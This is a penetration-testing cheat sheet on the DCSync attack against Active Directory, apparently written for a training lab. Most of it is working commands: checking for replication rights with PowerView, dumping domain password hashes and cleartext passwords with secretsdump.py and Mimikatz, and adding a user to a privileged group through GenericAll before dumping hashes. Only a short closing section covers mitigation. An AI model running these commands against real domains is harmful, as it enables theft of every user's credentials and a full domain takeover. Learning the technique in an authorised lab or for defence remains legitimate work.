# DCSync

## Overview
- DCSync steals the Active Directory password database using the built-in Directory Replication Service Remote Protocol
- Mimics a Domain Controller to retrieve user NTLM password hashes
- Requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights
- Domain/Enterprise Admins have this right by default

## Checking for DCSync Rights

### PowerView
```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### BloodHound
- Use pre-built query: "Find Principals with DCSync Rights"

## Performing DCSync

### From Linux with secretsdump.py
```bash
# Dump all hashes
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# NTLM hashes only
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Specific user only
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5

# Additional useful flags
# -pwd-last-set    Show when each password was last changed
# -history         Dump password history
# -user-status     Show if user is disabled
```

### From Windows with Mimikatz
```
# Must run as user with DCSync rights (use runas if needed)
runas /netonly /user:INLANEFREIGHT\adunn powershell

# In the new PowerShell session
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

## Output Files
- When using `-just-dc` flag, three files are created:
  - `.ntds` - NTLM hashes
  - `.ntds.kerberos` - Kerberos keys  
  - `.ntds.cleartext` - Cleartext passwords (accounts with reversible encryption)

## Reversible Encryption
- Accounts with "Store passwords using reversible encryption" enabled store passwords using RC4 encryption
- The Syskey can decrypt them, and tools like secretsdump.py will show cleartext
- Check for accounts with reversible encryption:
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

## DCSync via Group Membership Abuse

If you have GenericAll over a group that holds DCSync rights (e.g., `GetChanges` and `GetChangesAll`), add yourself to that group then perform DCSync.

### Add User to Privileged Group

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)

$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'targetuser' -Credential $Cred -Verbose
```

### DCSync After Group Addition

```bash
secretsdump.py targetuser@DC_IP -just-dc-ntlm
```

### Cleanup

```powershell
Remove-DomainGroupMember -Identity "Server Admins" -Members 'targetuser' -Credential $Cred -Verbose
```

---

## Mitigation
- Limit accounts with DCSync rights to only Domain Controllers
- Monitor for replication requests from non-DC sources
- Audit the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions regularly
